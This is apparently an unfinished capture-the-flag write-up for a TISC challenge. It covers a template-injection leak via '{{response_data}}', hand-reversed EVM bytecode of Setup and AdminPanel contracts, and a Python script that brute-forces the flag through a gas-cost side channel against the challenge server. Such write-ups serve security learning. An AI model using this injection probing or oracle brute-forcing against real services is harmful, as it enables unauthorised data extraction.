NOTE: This writeup is still WIP. Here are some notes I took while solving the challenge, as well as any solve script(s)

* Found ssti
	* leak response_data (`{{response_data}}`), get bytecode of contracts
* used ethervm.io/decompile to get decompilation & disassembly
* hand reversed AdminPanel contract from disassembly (cant decompile properly fsr)
	* Check that starts with `TISC{` and ends with `}`
	* deduce that flag is 17 characters total
	* Calculates `flag[4:] ^ (keccak256(0x6b35340a) << 0x98)`
	* It must be equal to the output of delegatecall for the function to return true
		* address: `calldata[0x24:0x44]`
		* arguments offset: `0x3c`
		* arguments length: `0x4`
		* return offset: `0x0`
		* return length: `0x20`
		* I assume this function is in the `Secret` contract, whose bytecode is not provided.
* look at decompilation of Setup contract
	* calls a function on another contract that I assume is the function in AdminPanel contract
* after many unsuccessful attempts, return to web stuff
* realised that the `gas` value is provided
* recall from previous googling that each opcode has a certain gas cost, hence total gas cost of a transaction is calculated based on what opcodes are executed
* we can use `gas` as an oracle (more opcodes are executed for success path, when flag check fails it ends early)
* write python script:

```python:s.py
import requests
from string import printable

template = list('{XXXXXXXXXXX}' + '{{response_data}}')

space = set(printable).difference('#{}%')

for x in range(1, 12):
    for c in space:
        payload = template[:]
        payload[x] = c
        resp = requests.post('http://chals.tisc24.ctf.sg:52416/submit',
                             data={'password': ''.join(payload)})
        search_for = "&#39;gas&#39;: "
        try:
            i = resp.text.index(search_for) + len(search_for)
            j = resp.text.index('}', i)
            gas = int(resp.text[i:j])
            if gas >= 33377:
                print(c, end='', flush=True)
                break
        except:
            print(resp.text)
            import sys
            sys.exit(1)
```

my notes (a bit disorganised) for setup contract reversing

```plaintext:setup.notes.txt
# 0x10A: A | B | C | D | E | val
    -> val == 1, $pc=A
# 0x127: A | B | C | D
    -> msg.data[C], $pc=A
# 0x14F: A | B | C | D | E | F
    -> E+C, $pc=A, memory[E+C]=0
# 0x17E: A | B | C | D
    -> C, $pc=A

unknown, 0, storage[0], (1 << 0xa0) - 1, 0, memory[0x40], 0
- 'stack base ptr' at memory[0x40], 32 bytes
- base[0x24] = arg0
- base[0x44] = storage[1] & ((1 << 0xa0) - 1) # mask last 20 bytes of storage
- base[0] = 0x44
- base[0x20] = base[0x20] & ((1 << 0xe0) - 1) | b'TISC'  # replace first 4 bytes with TISC
- storage[0] & ((1 << 0xa0) - 1)
- addr = func_012E(base, base+0x64)
- address(storage[0] & ((1 << 0xa0) - 1)).call(memory[base+0x64:base+0x64+0x44]) 

- storage[0] should be address of AdminPanel contract
- storage[1] should be address of Secret contract

# func_012E
- number = memory[base] (should be 0x44)
- i
while (true) {
  if (i >= number) {
    memory[base + 0x64 + number] = 0
    return base + 0x64 + number;
  }
  memory[base + 0x64 + i] = memory[base + i + 0x20] # copy 0x20 sized chunk
  i += 0x20
}
```

notes for adminpanel reverse:

```plaintext:adminpanel.notes.txt
- check that starts with `TISC{` and ends with `}`
- `Secret.getSecret() == user_input[4:] ^ (keccak256(0x6b35340a) << 0x98)`

all the following are in uint256 words (i.e. memory[0x60] means memory[0x60:0x60+0x20])
- memory[0x60] = 0x6b35340a
- memory[0x20] = 0x66fbf07e // parameter passed to secret call (the selector). Probably a getsecret function
- memory[0x40] = 0x1 if passes check else 0x0
- memory[0x0] = return value of secret call
```
